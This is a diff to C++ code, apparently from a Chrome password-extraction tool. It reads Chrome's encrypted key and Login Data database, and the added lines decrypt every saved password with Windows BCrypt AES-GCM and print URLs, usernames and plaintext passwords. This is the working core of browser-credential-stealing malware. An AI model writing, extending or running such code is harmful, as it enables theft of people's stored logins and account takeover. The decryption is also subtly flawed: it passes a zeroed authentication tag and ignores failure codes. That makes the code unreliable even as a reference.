@@ -51,7 +51,6 @@ void chrome::get(void) {
     try {
         json j = json::parse(key_file);
         std::string key_data_b64 = j["os_crypt"]["encrypted_key"];
-        std::cout << "key_data_b64 = " << key_data_b64 << "\n";
         key_data = b64_decode(&key_data_b64[0]);
     } catch (json::exception &) {
         std::cerr << "json exception\n";
@@ -80,17 +79,51 @@ void chrome::get(void) {
         return;
     }
 
+    ULONG bytes_copied;
+    BCRYPT_AUTH_TAG_LENGTHS_STRUCT auth_tag_lengths;
+    BCryptGetProperty(m_aes_alg.get(), BCRYPT_AUTH_TAG_LENGTH, (PUCHAR)&auth_tag_lengths, sizeof (auth_tag_lengths), &bytes_copied, 0);
+
     int step_ret = 0;
     while ((step_ret = sqlite3_step(statement.get())) == SQLITE_ROW) {
         std::string action_url = reinterpret_cast<const char *>(sqlite3_column_text(statement.get(), 0));
         std::string date_created = format_time(sqlite3_column_int64(statement.get(), 1));
         std::string username_value = reinterpret_cast<const char *>(sqlite3_column_text(statement.get(), 2));
-        std::cout << "action url: " << action_url << "\n";
-        std::cout << "date_created: " << date_created << "\n";
-        std::cout << "username_value: " << username_value << "\n";
+
+        const uint8_t *password_value = reinterpret_cast<const uint8_t *>(sqlite3_column_blob(statement.get(), 3));
+        const size_t password_value_size = sqlite3_column_bytes(statement.get(), 3);
+
+        // first 3 bytes of password_value are kEncryptionVersionPrefix ("v10")
+        std::vector<uint8_t> nonce(password_value + 3, password_value + 15),
+                             ciphertext(password_value + 15, password_value + password_value_size);
+
+        std::vector<uint8_t> auth_tag(auth_tag_lengths.dwMinLength);
+
+        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO auth_info;
+        BCRYPT_INIT_AUTH_MODE_INFO(auth_info);
+        auth_info.pbNonce = nonce.data();
+        auth_info.cbNonce = (ULONG)nonce.size();
+        auth_info.pbTag = auth_tag.data();
+        auth_info.cbTag = (ULONG)auth_tag.size();
+
+        std::string password_plaintext(ciphertext.size(), '\0');
+        BCryptDecrypt(
+                key.get(),
+                ciphertext.data(), ciphertext.size(),
+                &auth_info,
+                NULL, 0,
+                reinterpret_cast<PUCHAR>(password_plaintext.data()), password_plaintext.size(),
+                &bytes_copied,
+                0);
+        password_plaintext.resize(password_plaintext.size() - 16);
+
+        std::cout << "action_url: " << action_url << "\n"
+                  << "date_created: " << date_created << "\n"
+                  << "username_value: " << username_value << "\n"
+                  << "password: " << password_plaintext << "\n\n";
     }
     if (step_ret != SQLITE_DONE) {
-        return; // TODO:
+        std::cerr << "error reading database\n";
+        return;
     }
 }
 
